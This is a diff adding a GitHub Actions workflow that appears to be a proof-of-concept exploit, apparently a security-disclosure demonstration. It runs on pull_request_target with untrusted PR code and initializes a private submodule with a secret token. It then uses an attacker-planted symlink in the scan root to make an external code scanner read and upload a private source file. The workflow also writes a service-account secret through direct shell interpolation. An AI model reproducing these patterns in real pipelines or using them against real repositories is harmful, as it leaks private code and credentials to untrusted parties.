@@ -1,0 +1,93 @@
+name: S1 Private Submodule Path Proof
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  checks-scan:
+    if: >-
+      github.event.pull_request.head.repo.full_name == 'cllc3993/checks-s1-ci-impact-poc' &&
+      startsWith(github.event.pull_request.head.ref, 'accountb-private-submodule-')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR head
+        uses: actions/checkout@v4
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Initialize victim private submodule at public project path
+        shell: bash
+        env:
+          PRIVATE_SOURCE_REPO_TOKEN: ${{ secrets.PRIVATE_SOURCE_REPO_TOKEN }}
+        run: |
+          set -euo pipefail
+          test -f .gitmodules
+          git config --file .gitmodules --get submodule.libs/private.path
+          git config --file .gitmodules --get submodule.libs/private.url
+          if [[ -z "${PRIVATE_SOURCE_REPO_TOKEN:-}" ]]; then
+            printf 'private-source-token-missing\n'
+            exit 1
+          fi
+          private_auth="$(printf 'x-access-token:%s' "$PRIVATE_SOURCE_REPO_TOKEN" | base64 -w0)"
+          git -c "http.https://github.com/.extraheader=AUTHORIZATION: basic ${private_auth}" \
+            submodule update --init --depth=1 libs/private
+          private_source="libs/private/src/main/java/com/acme/privatepkg/CredentialCanary.java"
+          if [[ -s "$private_source" ]]; then
+            printf 'private-submodule-source-exists path=%s bytes=%s\n' "$private_source" "$(wc -c < "$private_source")"
+          else
+            printf 'private-submodule-source-missing path=%s\n' "$private_source"
+            exit 1
+          fi
+
+      - name: Verify PR-controlled symlink stays inside requested scan root
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -d scan-root
+          test -L scan-root/PrivateSubmoduleLeak.java
+          target="$(readlink scan-root/PrivateSubmoduleLeak.java)"
+          test "$target" = "../libs/private/src/main/java/com/acme/privatepkg/CredentialCanary.java"
+          printf 'scan-root=%s\n' "$PWD/scan-root"
+          printf 'attacker-symlink=%s -> %s\n' "scan-root/PrivateSubmoduleLeak.java" "$target"
+          printf 'resolved-target=%s\n' "$(readlink -f scan-root/PrivateSubmoduleLeak.java)"
+          git ls-files -s .gitmodules libs/private scan-root/PrivateSubmoduleLeak.java
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Materialize Checks service-account credentials
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf '%s' '${{ secrets.CHECKS_SERVICE_ACCOUNT_JSON }}' > "$RUNNER_TEMP/checks-sa.json"
+          chmod 600 "$RUNNER_TEMP/checks-sa.json"
+
+      - name: Run Checks scan on requested scan root only
+        shell: bash
+        env:
+          CHECKS_CREDENTIALS: ${{ runner.temp }}/checks-sa.json
+        run: |
+          set -euo pipefail
+          ./checks code scan scan-root \
+            --account-id=2023322768 \
+            --repo-id=1867966104 \
+            --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
+            --branch-name=ci-private-submodule-source \
+            --scm-revision="S1_PRIVATE_SUBMODULE_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --format=json \
+            --wait-and-print-report \
+            --timeout=20m \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input | tee "$RUNNER_TEMP/checks-s1-submodule-output.json"
